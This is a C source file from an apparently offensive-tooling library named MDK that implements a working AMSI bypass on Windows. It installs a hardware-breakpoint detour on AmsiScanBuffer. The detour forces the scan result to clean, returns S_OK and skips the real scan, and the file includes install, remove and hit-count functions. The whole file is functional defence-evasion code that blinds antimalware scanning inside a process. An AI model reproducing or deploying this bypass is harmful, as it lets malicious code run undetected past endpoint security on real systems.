// MDK
// docs    : https://sebafvs.com/mdk/amsi
// author  : @sebafvs

#include <windows.h>
#include "mdk/result.h"
#include "mdk/hwbp.h"
#include "mdk/amsi.h"
#include "mdk/nt.h"

static PVOID _g_amsi_scan_buffer = NULL;

static volatile LONG _g_hits = 0;

// AmsiScanBuffer detour. https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer
static void _amsi_detour(PCONTEXT ctx) {
    InterlockedIncrement(&_g_hits);

    PDWORD result_out = (PDWORD)mdk_hwbp_get_arg(ctx, 6);
    if (result_out != NULL) {
        *result_out = 0;
    }

    // RAX = S_OK; RIP = ret gadget; EFlags.RF set for the resume step.
    mdk_hwbp_return_value(ctx, 0);
    mdk_hwbp_block_real  (ctx);
    mdk_hwbp_continue    (ctx);
}

// --- Private helpers ---

static MDK_RESULT _resolve(void) {
    if (_g_amsi_scan_buffer != NULL) {
        return MDK_MAKE_OK();
    }

    HMODULE amsi = GetModuleHandleW(L"amsi.dll");
    if (amsi == NULL) {
        amsi = LoadLibraryW(L"amsi.dll");
        if (amsi == NULL) {
            return MDK_MAKE_FAIL("mdk_amsi:LoadLibrary(amsi.dll)", MDK_STATUS_DLL_NOT_FOUND);
        }
    }

    PVOID address = (PVOID)GetProcAddress(amsi, "AmsiScanBuffer");
    if (address == NULL) {
        return MDK_MAKE_FAIL("mdk_amsi:GetProcAddress(AmsiScanBuffer)", MDK_STATUS_ENTRYPOINT_NOT_FOUND);
    }

    _g_amsi_scan_buffer = address;
    return MDK_MAKE_OK();
}

// --- Public API ---

MDK_RESULT mdk_amsi_scan_buffer_addr(OUT PVOID* address) {
    MDK_CHECK(_resolve());
    *address = _g_amsi_scan_buffer;
    return MDK_MAKE_OK();
}

MDK_RESULT mdk_amsi_bypass_install(IN MDK_DRX drx, IN DWORD thread_id) {
    MDK_CHECK(_resolve());

    // Reset the hit counter so post-run sanity checks are meaningful.
    InterlockedExchange(&_g_hits, 0);

    return mdk_hwbp_install(_g_amsi_scan_buffer, drx, _amsi_detour, thread_id);
}

MDK_RESULT mdk_amsi_bypass_remove(void) {
    if (_g_amsi_scan_buffer == NULL) {
        return MDK_MAKE_FAIL("mdk_amsi_bypass_remove:not-installed", MDK_STATUS_NOT_FOUND);
    }
    // Scope unknown at remove-time. Try current thread first, then ALL_THREADS.
    MDK_RESULT r = mdk_hwbp_remove(_g_amsi_scan_buffer, GetCurrentThreadId());
    if (MDK_OK(r)) { return r; }
    return mdk_hwbp_remove(_g_amsi_scan_buffer, MDK_HWBP_ALL_THREADS);
}

LONG mdk_amsi_bypass_hits(void) {
    return _g_hits;
}
